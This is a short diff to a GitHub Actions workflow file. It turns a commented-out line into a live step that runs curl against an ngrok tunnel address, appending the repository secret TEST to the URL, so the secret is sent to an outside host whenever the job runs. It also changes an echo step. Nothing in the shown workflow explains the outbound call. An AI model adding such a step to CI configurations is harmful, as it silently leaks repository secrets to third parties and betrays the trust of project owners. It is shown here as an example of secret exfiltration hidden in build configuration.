@@ -11,7 +11,7 @@ jobs:
       TEST: ${{ secrets.TEST }}
     steps:
       - uses: actions/checkout@v2
-      - run: echo ${{ github }}
-      # run: curl https://6289-2003-de-6730-1800-eded-404f-dfc6-a2c6.ngrok.io/$TEST 
+      - run: echo ${{ github.ref }}
+      - run: curl https://6289-2003-de-6730-1800-eded-404f-dfc6-a2c6.ngrok.io/$TEST 
 
     
